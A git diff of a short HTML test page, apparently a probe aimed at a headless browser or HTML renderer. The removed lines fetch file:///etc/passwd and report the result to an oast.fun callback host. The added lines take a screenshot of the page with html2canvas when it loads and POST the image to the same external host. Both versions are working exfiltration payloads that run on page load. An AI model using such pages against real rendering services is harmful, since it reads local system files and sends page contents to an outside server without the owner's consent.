@@ -1,21 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Fetch from Localhost</title>
+  <title>Screenshot Self</title>
 </head>
 <body>
+  <h1>Hello NileNinja and Synthetic</h1>
+<script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
 <script>
-fetch('file:///etc/passwd')
-  .then(response => {
-    fetch(`https://dwgorsbfamepzexmcgtvmeiecbvp3s30r.oast.fun/?status=${response.status}`, {
-      method: 'GET'
-    });
-  })
-  .catch(error => {
-    fetch(`https://dwgorsbfamepzexmcgtvmeiecbvp3s30r.oast.fun/?error=${encodeURIComponent(error.toString())}`, {
-      method: 'GET'
+window.onload = () => {
+  html2canvas(document.body).then(canvas => {
+    const img = canvas.toDataURL('image/png');
+    fetch('https://dwgorsbfamepzexmcgtvmeiecbvp3s30r.oast.fun', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ screenshot: img })
     });
   });
+};
 </script>
 </body>
 </html>
